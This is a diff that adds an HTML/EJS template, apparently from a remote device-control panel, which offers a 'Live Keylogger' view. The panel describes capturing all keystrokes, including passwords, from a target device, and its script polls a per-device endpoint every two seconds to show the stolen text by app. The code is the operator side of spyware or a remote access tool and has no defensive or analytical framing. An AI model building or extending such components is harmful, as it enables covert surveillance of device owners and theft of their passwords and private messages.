@@ -1,0 +1,56 @@
+<div class="glass rounded-xl p-6">
+    <h3 class="text-white font-semibold text-lg mb-2">Live Keylogger</h3>
+    <p class="text-slate-400 text-sm mb-4">Real-time keystroke capture from the device. Captures all text input including passwords.</p>
+
+    <div class="flex items-center gap-3 mb-4">
+        <button onclick="startKeylogger()" id="keylogBtn" class="btn-primary text-sm">Start Keylogger</button>
+        <button onclick="stopKeylogger()" class="btn-ghost text-sm">Stop</button>
+        <span class="text-slate-500 text-xs" id="keylogStatus">Stopped</span>
+    </div>
+
+    <div class="bg-slate-800/50 rounded-lg p-4 h-64 overflow-y-auto font-mono text-sm" id="keylogStream">
+        <div class="text-slate-600 text-center py-8">Keylogger output will appear here</div>
+    </div>
+</div>
+
+<script>
+    var keylogInterval = null;
+    var lastKeylogIdx = 0;
+
+    function startKeylogger() {
+        document.getElementById('keylogStatus').textContent = 'Active';
+        document.getElementById('keylogStatus').className = 'text-accent-green text-xs';
+        keylogInterval = setInterval(pollKeylogs, 2000);
+        pollKeylogs();
+    }
+
+    function stopKeylogger() {
+        if (keylogInterval) clearInterval(keylogInterval);
+        document.getElementById('keylogStatus').textContent = 'Stopped';
+        document.getElementById('keylogStatus').className = 'text-slate-500 text-xs';
+    }
+
+    function pollKeylogs() {
+        $.get('/manage/<%= deviceID %>/keylog/' + lastKeylogIdx, function(d) {
+            if (d.entries && d.entries.length > 0) {
+                var stream = document.getElementById('keylogStream');
+                d.entries.forEach(function(e) {
+                    lastKeylogIdx = Math.max(lastKeylogIdx, (e.idx || lastKeylogIdx + 1));
+                    var div = document.createElement('div');
+                    div.className = 'py-1 border-b border-slate-700/30';
+                    div.innerHTML = '<span class="text-accent-green">' + (e.app || 'system') + '</span> ' +
+                        '<span class="text-white">' + escapeHtml(e.text || '') + '</span>' +
+                        ' <span class="text-slate-600 text-xs">' + new Date(e.time).toLocaleTimeString() + '</span>';
+                    stream.appendChild(div);
+                    stream.scrollTop = stream.scrollHeight;
+                });
+            }
+        });
+    }
+
+    function escapeHtml(str) {
+        var div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    }
+</script>
